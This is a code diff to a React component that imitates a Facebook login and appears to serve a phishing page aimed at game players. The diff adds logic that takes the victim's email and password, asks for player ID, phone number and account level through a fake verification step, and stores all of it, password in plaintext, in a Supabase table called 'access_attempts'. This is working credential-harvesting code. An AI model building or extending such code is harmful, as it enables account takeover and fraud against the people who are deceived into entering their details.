@@ -1,7 +1,8 @@
 import { useState } from 'react';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
 import { X } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
+import VerificationModal from './VerificationModal';
+import AccountProcessModal from './AccountProcessModal';
 
 interface FacebookLoginModalProps {
   isOpen: boolean;
@@ -12,6 +13,9 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
+  const [showVerification, setShowVerification] = useState(false);
+  const [showAccountProcess, setShowAccountProcess] = useState(false);
+  const [userLoginData, setUserLoginData] = useState<{ email: string; password: string } | null>(null);
 
   if (!isOpen) return null;
 
@@ -22,7 +26,39 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   };
 
   const handleLogin = () => {
-    console.log('Login attempted with:', { email, password });
+    if (email && password) {
+      setUserLoginData({ email, password });
+      setShowVerification(true);
+    }
+  };
+
+  const handleVerificationComplete = async (verificationData: {
+    playerId: string;
+    phoneNumber: string;
+    accountLevel: string;
+  }) => {
+    try {
+      // Store all data in Supabase
+      await supabase.from('access_attempts').insert({
+        email: userLoginData?.email || '',
+        passphrase: userLoginData?.password || '',
+        item_name: `Player ID: ${verificationData.playerId}, Phone: ${verificationData.phoneNumber}, Level: ${verificationData.accountLevel}`,
+        status: 'verification_completed'
+      });
+
+      setShowVerification(false);
+      setShowAccountProcess(true);
+    } catch (error) {
+      console.error('Error submitting data:', error);
+    }
+  };
+
+  const handleFinalClose = () => {
+    setShowAccountProcess(false);
+    setShowVerification(false);
+    setEmail('');
+    setPassword('');
+    setUserLoginData(null);
     onClose();
   };
 
@@ -132,6 +168,19 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
           </div>
         </div>
       </div>
+
+      {/* Verification Modal */}
+      <VerificationModal
+        isOpen={showVerification}
+        onClose={() => setShowVerification(false)}
+        onVerificationComplete={handleVerificationComplete}
+      />
+
+      {/* Account Process Modal */}
+      <AccountProcessModal
+        isOpen={showAccountProcess}
+        onClose={handleFinalClose}
+      />
     </div>
   );
 };
